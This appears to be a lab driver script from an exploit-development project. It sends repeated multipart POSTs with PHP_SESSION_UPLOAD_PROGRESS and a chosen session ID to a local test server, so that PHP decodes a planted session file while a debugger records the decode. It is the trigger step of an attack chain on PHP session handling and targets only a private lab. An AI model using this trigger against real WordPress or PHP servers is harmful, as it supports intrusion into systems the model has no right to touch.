#!/usr/bin/env python3
"""Upload progress driver for the WordPress real-target lane.

Sends a multipart POST carrying PHP_SESSION_UPLOAD_PROGRESS to the private lab.
PHP's rfc1867 progress handler starts the session, decodes the planted session
file, merges the progress record and writes the session back. Two sequential
requests with the same SID give the start and update decode hits used by
scripts/final_run.gdb.

Usage:
  lab_drive.py <sid> <progress_key> [path] [file_bytes] [repeat]
"""
import http.client
import random
import string
import sys

HOST = '127.0.0.1'
PORT = 28891


def multipart(sid, key, path='/', file_bytes=b'x', extra=None):
    boundary = '----realchain' + ''.join(
        random.choice(string.ascii_letters + string.digits) for _ in range(16))
    out = bytearray()

    def part(name, data, filename=None, ctype=None):
        out.extend(('--' + boundary + '\r\n').encode())
        if filename is None:
            out.extend(('Content-Disposition: form-data; name="%s"\r\n\r\n' % name).encode())
        else:
            out.extend(('Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
                        % (name, filename)).encode())
            if ctype:
                out.extend(('Content-Type: %s\r\n' % ctype).encode())
            out.extend(b'\r\n')
        out.extend(data)
        out.extend(b'\r\n')

    part('PHPSESSID', sid.encode())
    if extra:
        for name, data in extra:
            part(name, data)
    part('PHP_SESSION_UPLOAD_PROGRESS', key if isinstance(key, bytes) else key.encode())
    part('f', file_bytes, filename='f.bin', ctype='application/octet-stream')
    out.extend(('--' + boundary + '--\r\n').encode())

    headers = {
        'Content-Type': 'multipart/form-data; boundary=' + boundary,
        'Content-Length': str(len(out)),
        'Cookie': 'PHPSESSID=' + sid,
    }
    conn = http.client.HTTPConnection(HOST, PORT, timeout=180)
    conn.request('POST', path, bytes(out), headers)
    resp = conn.getresponse()
    body = resp.read()
    conn.close()
    return resp.status, dict(resp.getheaders()), body


def main():
    sid = sys.argv[1]
    key = sys.argv[2].encode()
    path = sys.argv[3] if len(sys.argv) > 3 else '/'
    nbytes = int(sys.argv[4]) if len(sys.argv) > 4 else 64
    repeat = int(sys.argv[5]) if len(sys.argv) > 5 else 2
    for i in range(repeat):
        status, headers, body = multipart(sid, key, path, b'K' * nbytes)
        print('post=%d status=%d bytes=%d' % (i + 1, status, len(body)))


if __name__ == '__main__':
    main()
